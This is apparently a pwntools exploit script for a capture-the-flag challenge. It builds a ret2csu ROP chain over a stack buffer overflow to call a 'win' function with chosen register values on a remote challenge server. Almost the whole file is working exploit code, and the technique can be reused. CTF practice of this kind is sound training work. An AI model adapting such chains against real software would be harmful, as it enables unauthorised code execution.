#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("157.180.85.167", 50003)

    return r


def main():
    r = conn()

    # I won't type much in here but I will drop a blog about the technique used in this exploit
    # its easy to understand and its a very useful technique to have in your arsenal for pwn challenges
    # the technique is called ret2csu
    # the blog link (https://ir0nstone.gitbook.io/notes/binexp/stack/ret2csu)
    # and here's how to exploit it (https://ir0nstone.gitbook.io/notes/binexp/stack/ret2csu/exploitation)

    rop = ROP(exe)

    offset = 0x40 + 8

    rdi = 0xDEADBEEFCAFEBABE
    rsi = 0x1337133713371337
    rdx = 0xFEEDFACEFEEDFACE

    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    csu = exe.symbols["__libc_csu_init"]
    csu_call = csu + 0x40
    csu_pop = csu + 0x5a

    init_array = exe.get_section_by_name(".init_array").header.sh_addr
    win = exe.plt["win"]

    payload = flat(
        b"A" * offset,
        p64(csu_pop),
        0,  # rbx
        1,  # rbp
        0,  # r12
        0,  # r13
        rdx,  # r14 -> rdx
        init_array,  # r15 -> [r15] gets called (frame_dummy) just to prevent crashing
        p64(csu_call),
        b"B" * 8,
        0, # just for the pops in the csu call
        0,
        0,
        0,
        0,
        0,
        p64(pop_rdi),
        rdi,
        p64(pop_rsi_r15),
        rsi,
        0,
        p64(ret),
        p64(win),
    )

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
